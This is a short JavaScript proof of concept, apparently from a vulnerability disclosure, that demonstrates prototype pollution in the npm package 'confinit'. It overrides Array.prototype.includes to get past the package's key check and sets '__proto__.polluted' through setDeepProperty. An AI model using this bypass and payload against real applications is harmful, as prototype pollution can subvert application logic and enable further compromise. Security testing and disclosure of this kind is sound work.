Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const root = require('confinit');
const payload = '__proto__.polluted';
console.log({}.polluted);
root.setDeepProperty({}, payload, 'yes');
console.log({}.polluted);